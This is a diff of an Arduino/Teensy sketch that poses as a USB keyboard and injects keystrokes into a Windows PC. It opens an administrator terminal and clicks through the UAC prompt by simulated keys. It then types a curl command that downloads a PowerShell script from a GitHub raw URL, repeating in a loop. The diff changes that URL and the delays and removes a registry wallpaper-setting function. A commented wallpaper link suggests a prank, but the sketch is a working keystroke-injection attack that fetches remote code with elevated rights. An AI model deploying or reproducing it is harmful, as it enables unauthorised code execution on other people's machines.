@@ -71,43 +71,22 @@ void openTerminal()
   Keyboard.release(MODIFIERKEY_CTRL);
   Keyboard.release(MODIFIERKEY_LEFT_SHIFT);
   Keyboard.release(KEY_ENTER);
-  delay(2200);
+  delay(1800);
   //UAC 
   printKey(KEY_LEFT);
   delay(9);
   printKey(KEY_ENTER);
-  delay(2200);
+  delay(1200);
 }
 
-void addWallpaperToRegistry()
-{
-  Keyboard.print("reg add ");
-  printQuote();
-  Keyboard.print("HKCU");
-  printBackslash();
-  Keyboard.print("Control Panel");
-  printBackslash();
-  Keyboard.print("Desktop");
-  printQuote();
-  Keyboard.print(" /v Wallpaper /t REG_SZ /d ");
-  printQuote();
-  printPercentage();
-  Keyboard.print("userprofile");
-  printPercentage();
-  printBackslash();
-  Keyboard.print("Desktop");
-  printBackslash();
-  Keyboard.print("wallpaper.jpg");
-  printQuote();
-  Keyboard.print(" /f");
-}
+
 
 
 
 
 void setup() {
   Serial.begin(9600);
-  delay(3000);
+  delay(5000);
 }
 
 void loop() {
@@ -122,7 +101,7 @@ void loop() {
   delay(5);
   printKey(KEY_ENTER);
   delay(5);
-  Keyboard.print("curl -o scrpt.ps1 https://raw.githubusercontent.com/mkrapf/MWP/main/scrpt.ps1");
+  Keyboard.print("curl -o scrpt.ps1 https://raw.githubusercontent.com/mkrapf/AMWP/master/script/scrpt.ps1");
   delay(5);
   printKey(KEY_ENTER);
   delay(1000);
@@ -149,7 +128,7 @@ void loop() {
   
 
   // typing too rapidly can overwhelm a PC
-  delay(20000);
+  delay(30000);
 }
 
 //  Keyboard.print("curl -o %userprofile%\\Desktop\\wallpaper.jpg \"https://wallpapertag.com/wallpaper/full/d/0/c/716730-popular-funny-monkey-wallpaper-2560x1600.jpg\"");
